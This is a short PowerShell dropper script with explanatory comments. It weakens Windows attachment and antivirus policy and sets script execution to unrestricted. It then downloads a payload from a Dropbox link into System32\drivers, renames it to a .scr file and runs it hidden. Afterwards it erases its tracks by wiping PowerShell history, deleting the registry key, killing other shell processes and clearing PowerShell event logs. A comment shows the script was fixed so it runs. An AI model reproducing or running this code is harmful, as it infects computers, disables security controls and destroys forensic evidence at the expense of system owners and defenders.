# Temporary registry tweaks to bypass attachment policies (WARNING: Reduces security)
$Xinstance = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
$Yinstance = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"
Invoke-Expression $Xinstance | Out-Null
Invoke-Expression $Yinstance | Out-Null

# Allow unrestricted script execution for this process
Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null

# Check if Explorer is running (odd condition—perhaps to ensure GUI environment)
$explorerRunning = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
if ($explorerRunning) {
    $destination = "C:\Windows\System32\drivers\kpstmain.sys"
    $DriverExecution = "C:\Windows\System32\drivers\kpstmain.scr"
    $url = "https://www.dropbox.com/scl/fi/ow7b42p3i7sabc0lgloyl/kpstmain.sys?rlkey=wnj01h7aer6fl2q9a91cqbzjq&st=ebnh1tbg&dl=1"
    
    # Download payload
    Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    
    # Rename to executable
    Rename-Item -Path $destination -NewName $DriverExecution -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
    
    # Execute (FIXED: Use $DriverExecution instead of undefined $scrFile)
    Start-Process -FilePath $DriverExecution -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
    # Write-Output "Payload executed"  # Uncomment for debugging
}

# Clear session history
Clear-History

# Nuke/empty persistent history file
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (Test-Path $historyPath) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
} else {
    New-Item -Path $historyPath -ItemType File -Force | Out-Null
}
Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue

# Clean up registry changes
$attachmentsRegKeyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments"
if (Test-Path $attachmentsRegKeyPath) {
    Remove-Item -Path $attachmentsRegKeyPath -Recurse -Force | Out-Null
}

# Terminate other PowerShell instances (sparing current)
Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue | Out-Null

# Terminate unrelated conhost processes
Get-Process -Name "conhost" -ErrorAction SilentlyContinue | ForEach-Object {
    if ($_.Parent.Id -ne $PID) {
        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue | Out-Null
    }
}

# Clear PowerShell-related event logs (requires admin)
wevtutil el | Where-Object { $_ -match "PowerShell" } | ForEach-Object { wevtutil cl "$_" }

# Write-Output "Cleanup complete"  # Uncomment for debugging
